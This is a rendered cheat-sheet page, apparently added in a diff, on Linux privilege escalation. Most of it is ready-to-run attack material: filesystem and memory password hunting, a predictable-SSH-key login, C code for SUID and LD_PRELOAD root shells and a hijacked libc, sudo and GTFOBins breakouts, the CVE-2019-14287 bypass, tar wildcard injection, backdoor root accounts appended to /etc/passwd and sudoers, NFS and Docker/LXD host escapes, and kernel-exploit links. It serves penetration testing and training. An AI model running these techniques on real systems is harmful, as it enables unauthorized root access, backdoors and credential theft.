+<li>Checks if password hashes are stored in /etc/passwd</li>
+<li>Extract full details for 'default' uid's such as 0, 1000, 1001 etc</li>
+<li>Attempt to read restricted files i.e. /etc/shadow</li>
+<li>List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.)</li>
+<li>Basic SSH checks</li>
+<li>Privileged access:</li>
+<li>Which users have recently used sudo</li>
+<li>Determine if /etc/sudoers is accessible</li>
+<li>Determine if the current user has Sudo access without a password</li>
+<li>Are known 'good' breakout binaries available via Sudo (i.e. nmap, vim etc.)</li>
+<li>Is root's home directory accessible</li>
+<li>List permissions for /home/</li>
+<li>Environmental:</li>
+<li>Display current $PATH</li>
+<li>Displays env information</li>
+<li>Jobs/Tasks:</li>
+<li>List all cron jobs</li>
+<li>Locate all world-writable cron jobs</li>
+<li>Locate cron jobs owned by other users of the system</li>
+<li>List the active and inactive systemd timers</li>
+<li>Services:</li>
+<li>List network connections (TCP &amp; UDP)</li>
+<li>List running processes</li>
+<li>Lookup and list process binaries and associated permissions</li>
+<li>List inetd.conf/xined.conf contents and associated binary file permissions</li>
+<li>List init.d binary permissions</li>
+<li>Version Information (of the following):</li>
+<li>Sudo</li>
+<li>MYSQL</li>
+<li>Postgres</li>
+<li>Apache<ul>
+<li>Checks user config</li>
+<li>Shows enabled modules</li>
+<li>Checks for htpasswd files</li>
+<li>View www directories</li>
+</ul>
+</li>
+<li>Default/Weak Credentials:</li>
+<li>Checks for default/weak Postgres accounts</li>
+<li>Checks for default/weak MYSQL accounts</li>
+<li>Searches:</li>
+<li>Locate all SUID/GUID files</li>
+<li>Locate all world-writable SUID/GUID files</li>
+<li>Locate all SUID/GUID files owned by root</li>
+<li>Locate 'interesting' SUID/GUID files (i.e. nmap, vim etc)</li>
+<li>Locate files with POSIX capabilities</li>
+<li>List all world-writable files</li>
+<li>Find/list all accessible *.plan files and display contents</li>
+<li>Find/list all accessible *.rhosts files and display contents</li>
+<li>Show NFS server details</li>
+<li>Locate <em>.conf and </em>.log files containing keyword supplied at script runtime</li>
+<li>List all *.conf files located in /etc</li>
+<li>Locate mail</li>
+<li>Platform/software specific tests:</li>
+<li>Checks to determine if we're in a Docker container</li>
+<li>Checks to see if the host has Docker installed</li>
+<li>Checks to determine if we're in an LXC container</li>
+</ul>
+<h2 id="looting-for-passwords">Looting for passwords</h2>
+<h3 id="files-containing-passwords">Files containing passwords</h3>
+<pre><code class="language-powershell">grep --color=auto -rnw '/' -ie &quot;PASSWORD&quot; --color=always 2&gt; /dev/null
+find . -type f -exec grep -i -I &quot;PASSWORD&quot; {} /dev/null \;
+</code></pre>
+<h3 id="old-passwords-in-etcsecurityopasswd">Old passwords in /etc/security/opasswd</h3>
+<p>The <code>/etc/security/opasswd</code> file is used also by pam_cracklib to keep the history of old passwords so that the user will not reuse them.</p>
+<p>:warning: Treat your opasswd file like your /etc/shadow file because it will end up containing user password hashes </p>
+<h3 id="last-edited-files">Last edited files</h3>
+<p>Files that were edited in the last 10 minutes</p>
+<pre><code class="language-powershell">find / -mmin -10 2&gt;/dev/null | grep -Ev &quot;^/proc&quot;
+</code></pre>
+<h3 id="in-memory-passwords">In memory passwords</h3>
+<pre><code class="language-powershell">strings /dev/mem -n10 | grep -i PASS
+</code></pre>
+<h3 id="find-sensitive-files">Find sensitive files</h3>
+<pre><code class="language-powershell">$ locate password | more           
+/boot/grub/i386-pc/password.mod
+/etc/pam.d/common-password
+/etc/pam.d/gdm-password
+/etc/pam.d/gdm-password.original
+/lib/live/config/0031-root-password
+...
+</code></pre>
+<h2 id="ssh-key">SSH Key</h2>
+<h3 id="sensitive-files">Sensitive files</h3>
+<pre><code>find / -name authorized_keys 2&gt; /dev/null
+find / -name id_rsa 2&gt; /dev/null
+...
+</code></pre>
+<h3 id="ssh-key-predictable-prng-authorized_keys-process">SSH Key Predictable PRNG (Authorized_Keys) Process</h3>
+<p>This module describes how to attempt to use an obtained authorized_keys file on a host system.</p>
+<p>Needed : SSH-DSS String from authorized_keys file</p>
+<p><strong>Steps</strong></p>
+<ol>
+<li>Get the authorized_keys file. An example of this file would look like so:</li>
+</ol>
+<pre><code>ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ... 
+</code></pre>
+<ol>
+<li>Since this is an ssh-dss key, we need to add that to our local copy of <code>/etc/ssh/ssh_config</code> and <code>/etc/ssh/sshd_config</code>:</li>
+</ol>
+<pre><code>echo &quot;PubkeyAcceptedKeyTypes=+ssh-dss&quot; &gt;&gt; /etc/ssh/ssh_config
+echo &quot;PubkeyAcceptedKeyTypes=+ssh-dss&quot; &gt;&gt; /etc/ssh/sshd_config
+/etc/init.d/ssh restart
+</code></pre>
+<ol>
+<li>Get <a href="https://github.com/g0tmi1k/debian-ssh">g0tmi1k's debian-ssh repository</a> and unpack the keys:</li>
+</ol>
+<pre><code>git clone https://github.com/g0tmi1k/debian-ssh
+cd debian-ssh
+tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2
+</code></pre>
+<ol>
+<li>Grab the first 20 or 30 bytes from the key file shown above starting with the <code>"AAAA..."</code> portion and grep the unpacked keys with it as:</li>
+</ol>
+<pre><code>grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf'
+dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub
+</code></pre>
+<ol>
+<li>IF SUCCESSFUL, this will return a file (68b329da9893e34099c7d8ad5cb9c940-17934.pub) public file. To use the private key file to connect, drop the '.pub' extension and do:</li>
+</ol>
+<pre><code>ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934
+</code></pre>
+<p>And you should connect without requiring a password. If stuck, the <code>-vvv</code> verbosity should provide enough details as to why.</p>
+<h2 id="scheduled-tasks">Scheduled tasks</h2>
+<h3 id="cron-jobs">Cron jobs</h3>
+<p>Check if you have access with write permission on these files. <br />
+Check inside the file, to find other paths with write permissions.   </p>
+<pre><code class="language-powershell">/etc/init.d
+/etc/cron*
+/etc/crontab
+/etc/cron.allow
+/etc/cron.d 
+/etc/cron.deny
+/etc/cron.daily
+/etc/cron.hourly
+/etc/cron.monthly
+/etc/cron.weekly
+/etc/sudoers
+/etc/exports
+/etc/anacrontab
+/var/spool/cron
+/var/spool/cron/crontabs/root
+
+crontab -l
+ls -alh /var/spool/cron;
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny*
+</code></pre>
+<p>You can use <a href="https://github.com/DominicBreuker/pspy">pspy</a> to detect a CRON job.</p>
+<pre><code class="language-powershell"># print both commands and file system events and scan procfs every 1000 ms (=1sec)
+./pspy64 -pf -i 1000 
+</code></pre>
+<h2 id="systemd-timers">Systemd timers</h2>
+<pre><code class="language-powershell">systemctl list-timers --all
+NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
+Mon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service
+Mon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
+Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+
+3 timers listed.
+</code></pre>
+<h2 id="suid">SUID</h2>
+<p>SUID/Setuid stands for "set user ID upon execution", it is enabled by default in every Linux distributions. If a file with this bit is ran, the uid will be changed by the owner one. If the file owner is <code>root</code>, the uid will be changed to <code>root</code> even if it was executed from user <code>bob</code>. SUID bit is represented by an <code>s</code>.</p>
+<pre><code class="language-powershell">╭─swissky@lab ~  
+╰─$ ls /usr/bin/sudo -alh                  
+-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo
+</code></pre>
+<h3 id="find-suid-binaries">Find SUID binaries</h3>
+<pre><code class="language-bash">find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \;
+find / -uid 0 -perm -4000 -type f 2&gt;/dev/null
+</code></pre>
+<h3 id="create-a-suid-binary">Create a SUID binary</h3>
+<table>
+<thead>
+<tr>
+<th>Function</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>setreuid()</td>
+<td>sets real and effective user IDs of the calling process</td>
+</tr>
+<tr>
+<td>setuid()</td>
+<td>sets the effective user ID of the calling process</td>
+</tr>
+<tr>
+<td>setgid()</td>
+<td>sets the effective group ID of the calling process</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-bash">print 'int main(void){\nsetresuid(0, 0, 0);\nsystem(&quot;/bin/sh&quot;);\n}' &gt; /tmp/suid.c   
+gcc -o /tmp/suid /tmp/suid.c  
+sudo chmod +x /tmp/suid # execute right
+sudo chmod +s /tmp/suid # setuid bit
+</code></pre>
+<h2 id="capabilities">Capabilities</h2>
+<h3 id="list-capabilities-of-binaries">List capabilities of binaries</h3>
+<pre><code class="language-powershell">╭─swissky@lab ~  
+╰─$ /usr/bin/getcap -r  /usr/bin
+/usr/bin/fping                = cap_net_raw+ep
+/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
+/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+/usr/bin/rlogin               = cap_net_bind_service+ep
+/usr/bin/ping                 = cap_net_raw+ep
+/usr/bin/rsh                  = cap_net_bind_service+ep
+/usr/bin/rcp                  = cap_net_bind_service+ep
+</code></pre>
+<h3 id="edit-capabilities">Edit capabilities</h3>
+<pre><code class="language-powershell">/usr/bin/setcap -r /bin/ping            # remove
+/usr/bin/setcap cap_net_raw+p /bin/ping # add
+</code></pre>
+<h3 id="interesting-capabilities">Interesting capabilities</h3>
+<p>Having the capability =ep means the binary has all the capabilities.</p>
+<pre><code class="language-powershell">$ getcap openssl /usr/bin/openssl 
+openssl=ep
+</code></pre>
+<p>Alternatively the following capabilities can be used in order to upgrade your current privileges.</p>
+<pre><code class="language-powershell">cap_dac_read_search # read anything
+cap_setuid+ep # setuid
+</code></pre>
+<p>Example of privilege escalation with <code>cap_setuid+ep</code></p>
+<pre><code class="language-powershell">$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
+
+$ python2.7 -c 'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'
+sh-5.0# id
+uid=0(root) gid=1000(swissky)
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Capabilities name</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CAP_AUDIT_CONTROL</td>
+<td>Allow to enable/disable kernel auditing</td>
+</tr>
+<tr>
+<td>CAP_AUDIT_WRITE</td>
+<td>Helps to write records to kernel auditing log</td>
+</tr>
+<tr>
+<td>CAP_BLOCK_SUSPEND</td>
+<td>This feature can block system suspends</td>
+</tr>
+<tr>
+<td>CAP_CHOWN</td>
+<td>Allow user to make arbitrary change to files UIDs and GIDs</td>
+</tr>
+<tr>
+<td>CAP_DAC_OVERRIDE</td>
+<td>This helps to bypass file read, write and execute permission checks</td>
+</tr>
+<tr>
+<td>CAP_DAC_READ_SEARCH</td>
+<td>This only bypass file and directory read/execute permission checks</td>
+</tr>
+<tr>
+<td>CAP_FOWNER</td>
+<td>This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file</td>
+</tr>
+<tr>
+<td>CAP_KILL</td>
+<td>Allow the sending of signals to processes belonging to others</td>
+</tr>
+<tr>
+<td>CAP_SETGID</td>
+<td>Allow changing of the GID</td>
+</tr>
+<tr>
+<td>CAP_SETUID</td>
+<td>Allow changing of the UID</td>
+</tr>
+<tr>
+<td>CAP_SETPCAP</td>
+<td>Helps to transferring and removal of current set to any PID</td>
+</tr>
+<tr>
+<td>CAP_IPC_LOCK</td>
+<td>This helps to lock memory</td>
+</tr>
+<tr>
+<td>CAP_MAC_ADMIN</td>
+<td>Allow MAC configuration or state changes</td>
+</tr>
+<tr>
+<td>CAP_NET_RAW</td>
+<td>Use RAW and PACKET sockets</td>
+</tr>
+<tr>
+<td>CAP_NET_BIND_SERVICE</td>
+<td>SERVICE Bind a socket to internet domain privileged ports</td>
+</tr>
+</tbody>
+</table>
+<h2 id="sudo">SUDO</h2>
+<p>Tool: <a href="https://github.com/TH3xACE/SUDO_KILLER">Sudo Exploitation</a></p>
+<h3 id="nopasswd">NOPASSWD</h3>
+<p>Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.</p>
+<pre><code class="language-bash">$ sudo -l
+
+User demo may run the following commands on crashlab:
+    (root) NOPASSWD: /usr/bin/vim
+</code></pre>
+<p>In this example the user <code>demo</code> can run <code>vim</code> as <code>root</code>, it is now trivial to get a shell by adding an ssh key into the root directory or by calling <code>sh</code>.</p>
+<pre><code class="language-bash">sudo vim -c '!sh'
+sudo -u root vim -c '!sh'
+</code></pre>
+<h3 id="ld_preload-and-nopasswd">LD_PRELOAD and NOPASSWD</h3>
+<p>If <code>LD_PRELOAD</code> is explicitly defined in the sudoers file</p>
+<pre><code class="language-powershell">Defaults        env_keep += LD_PRELOAD
+</code></pre>
+<p>Compile the following shared object using the C code below with <code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code></p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+void _init() {
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    setgid(0);
+    setuid(0);
+    system(&quot;/bin/sh&quot;);
+}
+</code></pre>
+<p>Execute any binary with the LD_PRELOAD to spawn a shell : <code>sudo LD_PRELOAD=&lt;full_path_to_so_file&gt; &lt;program&gt;</code>, e.g: <code>sudo LD_PRELOAD=/tmp/shell.so find</code></p>
+<h3 id="doas">Doas</h3>
+<p>There are some alternatives to the <code>sudo</code> binary such as <code>doas</code> for OpenBSD, remember to check its configuration at <code>/etc/doas.conf</code></p>
+<pre><code class="language-bash">permit nopass demo as root cmd vim
+</code></pre>
+<h3 id="sudo_inject">sudo_inject</h3>
+<p>Using <a href="https://github.com/nongiach/sudo_inject">https://github.com/nongiach/sudo_inject</a></p>
+<pre><code class="language-powershell">$ sudo whatever
+[sudo] password for user:    
+# Press &lt;ctrl&gt;+c since you don't have the password. 
+# This creates an invalid sudo tokens.
+$ sh exploit.sh
+.... wait 1 seconds
+$ sudo -i # no password required :)
+# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>Slides of the presentation : <a href="https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf">https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf</a></p>
+<h3 id="cve-2019-14287">CVE-2019-14287</h3>
+<pre><code class="language-powershell"># Exploitable when a user have the following permissions (sudo -l)
+(ALL, !root) ALL
+
+# If you have a full TTY, you can exploit it like this
+sudo -u#-1 /bin/bash
+sudo -u#4294967295 id
+</code></pre>
+<h2 id="gtfobins">GTFOBins</h2>
+<p><a href="https://gtfobins.github.io">GTFOBins</a> is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p>
+<p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p>
+<blockquote>
+<p>gdb -nx -ex '!sh' -ex quit  <br />
+sudo mysql -e '! /bin/sh'  <br />
+strace -o /dev/null /bin/sh  <br />
+sudo awk 'BEGIN {system("/bin/sh")}'</p>
+</blockquote>
+<h2 id="wildcard">Wildcard</h2>
+<p>By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that's where the wildcard comes in handy.</p>
+<pre><code class="language-powershell"># create file for exploitation
+touch -- &quot;--checkpoint=1&quot;
+touch -- &quot;--checkpoint-action=exec=sh shell.sh&quot;
+echo &quot;#\!/bin/bash\ncat /etc/passwd &gt; /tmp/flag\nchmod 777 /tmp/flag&quot; &gt; shell.sh
+
+# vulnerable script
+tar cf archive.tar *
+</code></pre>
+<p>Tool: <a href="https://github.com/localh0t/wildpwn">wildpwn</a></p>
+<h2 id="writable-files">Writable files</h2>
+<p>List world writable files on the system.</p>
+<pre><code class="language-powershell">find / -writable ! -user `whoami` -type f ! -path &quot;/proc/*&quot; ! -path &quot;/sys/*&quot; -exec ls -al {} \; 2&gt;/dev/null
+find / -perm -2 -type f 2&gt;/dev/null
+find / ! -path &quot;*/proc/*&quot; -perm -2 -type f -print 2&gt;/dev/null
+</code></pre>
+<h3 id="writable-etcsysconfignetwork-scripts-centosredhat">Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)</h3>
+<p>/etc/sysconfig/network-scripts/ifcfg-1337 for example</p>
+<pre><code class="language-powershell">NAME=Network /bin/id  &amp;lt;= Note the blank space
+ONBOOT=yes
+DEVICE=eth0
+
+EXEC :
+./etc/sysconfig/network-scripts/ifcfg-1337
+</code></pre>
+<p>src : <a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f">https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</a></p>
+<h3 id="writable-etcpasswd">Writable /etc/passwd</h3>
+<p>First generate a password with one of the following commands.</p>
+<pre><code class="language-powershell">openssl passwd -1 -salt hacker hacker
+mkpasswd -m SHA-512 hacker
+python2 -c 'import crypt; print crypt.crypt(&quot;hacker&quot;, &quot;$6$salt&quot;)'
+</code></pre>
+<p>Then add the user <code>hacker</code> and add the generated password.</p>
+<pre><code class="language-powershell">hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
+</code></pre>
+<p>E.g: <code>hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash</code></p>
+<p>You can now use the <code>su</code> command with <code>hacker:hacker</code></p>
+<p>Alternatively you can use the following lines to add a dummy user without a password.  <br />
+WARNING: you might degrade the current security of the machine.</p>
+<pre><code class="language-powershell">echo 'dummy::0:0::/root:/bin/bash' &gt;&gt;/etc/passwd
+su - dummy
+</code></pre>
+<p>NOTE: In BSD platforms <code>/etc/passwd</code> is located at <code>/etc/pwd.db</code> and <code>/etc/master.passwd</code>, also the <code>/etc/shadow</code> is renamed to <code>/etc/spwd.db</code>. </p>
+<h3 id="writable-etcsudoers">Writable /etc/sudoers</h3>
+<pre><code class="language-powershell">echo &quot;username ALL=(ALL:ALL) ALL&quot;&gt;&gt;/etc/sudoers
+
+# use SUDO without password
+echo &quot;username ALL=(ALL) NOPASSWD: ALL&quot; &gt;&gt;/etc/sudoers
+echo &quot;username ALL=NOPASSWD: /bin/bash&quot; &gt;&gt;/etc/sudoers
+</code></pre>
+<h2 id="nfs-root-squashing">NFS Root Squashing</h2>
+<p>When <strong>no_root_squash</strong> appears in <code>/etc/exports</code>, the folder is shareable and a remote user can mount it.</p>
+<pre><code class="language-powershell"># remote check the name of the folder
+showmount -e 10.10.10.10
+
+# create dir
+mkdir /tmp/nfsdir  
+
+# mount directory 
+mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
+cd /tmp/nfsdir
+
+# copy wanted shell 
+cp /bin/bash .  
+
+# set suid permission
+chmod +s bash   
+</code></pre>
+<h2 id="shared-library">Shared Library</h2>
+<h3 id="ldconfig">ldconfig</h3>
+<p>Identify shared libraries with <code>ldd</code></p>
+<pre><code class="language-powershell">$ ldd /opt/binary
+    linux-vdso.so.1 (0x00007ffe961cd000)
+    vulnlib.so.8 =&gt; /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
+    /lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        
+</code></pre>
+<p>Create a library in <code>/tmp</code> and activate the path.</p>
+<pre><code class="language-powershell">gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
+echo &quot;/tmp/&quot; &gt; /etc/ld.so.conf.d/exploit.conf &amp;&amp; ldconfig -l /tmp/vulnlib.so
+/opt/binary
+</code></pre>
+<h3 id="rpath">RPATH</h3>
+<pre><code class="language-powershell">level15@nebula:/home/flag15$ readelf -d flag15 | egrep &quot;NEEDED|RPATH&quot;
+ 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
+ 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
+
+level15@nebula:/home/flag15$ ldd ./flag15 
+ linux-gate.so.1 =&gt;  (0x0068c000)
+ libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x00110000)
+ /lib/ld-linux.so.2 (0x005bb000)
+</code></pre>
+<p>By copying the lib into <code>/var/tmp/flag15/</code> it will be used by the program in this place as specified in the <code>RPATH</code> variable.</p>
+<pre><code class="language-powershell">level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
+
+level15@nebula:/home/flag15$ ldd ./flag15 
+ linux-gate.so.1 =&gt;  (0x005b0000)
+ libc.so.6 =&gt; /var/tmp/flag15/libc.so.6 (0x00110000)
+ /lib/ld-linux.so.2 (0x00737000)
+</code></pre>
+<p>Then create an evil library in <code>/var/tmp</code> with <code>gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6</code></p>
+<pre><code class="language-powershell">#include&lt;stdlib.h&gt;
+#define SHELL &quot;/bin/sh&quot;
+
+int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
+{
+ char *file = SHELL;
+ char *argv[] = {SHELL,0};
+ setresuid(geteuid(),geteuid(), geteuid());
+ execve(file,argv,0);
+}
+</code></pre>
+<h2 id="groups">Groups</h2>
+<h3 id="docker">Docker</h3>
+<p>Mount the filesystem in a bash container, allowing you to edit the <code>/etc/passwd</code> as root, then add a backdoor account <code>toor:password</code>.</p>
+<pre><code class="language-bash">$&gt; docker run -it --rm -v $PWD:/mnt bash
+$&gt; echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' &gt;&gt; /mnt/etc/passwd
+</code></pre>
+<p>Almost similar but you will also see all processes running on the host and be connected to the same NICs.</p>
+<pre><code class="language-powershell">docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
+</code></pre>
+<p>Or use the following docker image from <a href="https://hub.docker.com/r/chrisfosterelli/rootplease/">chrisfosterelli</a> to spawn a root shell</p>
+<pre><code class="language-powershell">$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
+latest: Pulling from chrisfosterelli/rootplease
+2de59b831a23: Pull complete 
+354c3661655e: Pull complete 
+91930878a2d7: Pull complete 
+a3ed95caeb02: Pull complete 
+489b110c54dc: Pull complete 
+Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
+Status: Downloaded newer image for chrisfosterelli/rootplease:latest
+
+You should now have a root shell on the host OS
+Press Ctrl-D to exit the docker instance / shell
+
+sh-5.0# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>More docker privilege escalation using the Docker Socket.</p>
+<pre><code class="language-powershell">sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+</code></pre>
+<h3 id="lxclxd">LXC/LXD</h3>
+<p>The privesc requires to run a container with elevated privileges and mount the host filesystem inside.</p>
+<pre><code class="language-powershell">╭─swissky@lab ~  
+╰─$ id
+uid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel)
+</code></pre>
+<p>Build an Alpine image and start it using the flag <code>security.privileged=true</code>, forcing the container to interact as root with the host filesystem.</p>
+<pre><code class="language-powershell"># build a simple alpine image
+git clone https://github.com/saghul/lxd-alpine-builder
+./build-alpine -a i686
+
+# import the image
+lxc image import ./alpine.tar.gz --alias myimage
+
+# run the image
+lxc init myimage mycontainer -c security.privileged=true
+
+# mount the /root into the image
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+
+# interact with the container
+lxc start mycontainer
+lxc exec mycontainer /bin/sh
+</code></pre>
+<p>Alternatively https://github.com/initstring/lxd_root</p>
+<h2 id="hijack-tmux-session">Hijack TMUX session</h2>
+<p>Require a read access to the tmux socket : <code>/tmp/tmux-1000/default</code>.</p>
+<pre><code class="language-powershell">export TMUX=/tmp/tmux-1000/default,1234,0 
+tmux ls
+</code></pre>
+<h2 id="kernel-exploits">Kernel Exploits</h2>
+<p>Precompiled exploits can be found inside these repositories, run them at your own risk !
+* <a href="https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits">bin-sploits - @offensive-security</a>
+* <a href="https://github.com/lucyoa/kernel-exploits/">kernel-exploits - @lucyoa</a></p>
+<p>The following exploits are known to work well, search for more exploits with <code>searchsploit -w linux kernel centos</code>.</p>
+<p>Another way to find a kernel exploit is to get the specific kernel version and linux distro of the machine by doing <code>uname -a</code>
+Copy the kernel version and distribution, and search for it in google or in https://www.exploit-db.com/.</p>
+<h3 id="cve-2022-0847-dirtypipe">CVE-2022-0847 (DirtyPipe)</h3>
+<p>Linux Privilege Escalation - Linux Kernel 5.8 &lt; 5.16.11</p>
+<pre><code>https://www.exploit-db.com/exploits/50808
+</code></pre>
+<h3 id="cve-2016-5195-dirtycow">CVE-2016-5195 (DirtyCow)</h3>
+<p>Linux Privilege Escalation - Linux Kernel &lt;= 3.19.0-73.8</p>
+<pre><code class="language-powershell"># make dirtycow stable
+echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs
+g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
+</code></pre>
+<h3 id="cve-2010-3904-rds">CVE-2010-3904 (RDS)</h3>
+<p>Linux RDS Exploit - Linux Kernel &lt;= 2.6.36-rc8</p>
+<pre><code class="language-powershell">https://www.exploit-db.com/exploits/15285/
+</code></pre>
+<h3 id="cve-2010-4258-full-nelson">CVE-2010-4258 (Full Nelson)</h3>
+<p>Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)</p>
+<pre><code class="language-powershell">https://www.exploit-db.com/exploits/15704/
+</code></pre>
+<h3 id="cve-2012-0056-mempodipper">CVE-2012-0056 (Mempodipper)</h3>
+<p>Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)</p>
+<pre><code class="language-powershell">https://www.exploit-db.com/exploits/18411
+</code></pre>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://mn3m.info/posts/suid-vs-capabilities/">SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m</a></li>
+<li><a href="https://fosterelli.co/privilege-escalation-via-docker.html">Privilege escalation via Docker - April 22, 2015 - Chris Foster</a></li>
+<li><a href="https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/">An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018</a></li>
+<li><a href="https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/">Exploiting wildcards on Linux - Berislav Kucan</a></li>
+<li><a href="http://p4pentest.in/2016/10/19/code-execution-with-tar-command/">Code Execution With Tar Command - p4pentest</a></li>
+<li><a href="http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">Back To The Future: Unix Wildcards Gone Wild - Leon Juranic</a></li>
+<li><a href="https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/">HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018</a></li>
+<li><a href="https://reboare.github.io/lxd/lxd-escape.html">Privilege Escalation via lxd - @reboare</a></li>
+<li><a href="https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/">Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018</a></li>
+<li><a href="https://github.com/nongiach/sudo_inject">Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc</a></li>
+<li><a href="http://www.deer-run.com/~hal/sysadmin/pam_cracklib.html">Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates</a></li>
+<li><a href="https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf">Local Privilege Escalation Workshop - Slides.pdf - @sagishahar</a></li>
+<li><a href="https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/SSH/key-exploit.md">SSH Key Predictable PRNG (Authorized_Keys) Process - @weaknetlabs</a></li>
+<li><a href="https://dirtypipe.cm4all.com/">The Dirty Pipe Vulnerability</a></li>
+</ul>
+
+  <hr>
+<div class="md-source-file">
+  <small>
+    
+      Last update:
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">August 30, 2022</span>
+      
+    
+  </small>
+</div>
+
+
+
+
+              
+            </article>
+            
+          </div>
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+            Back to top
+          </a>
+        
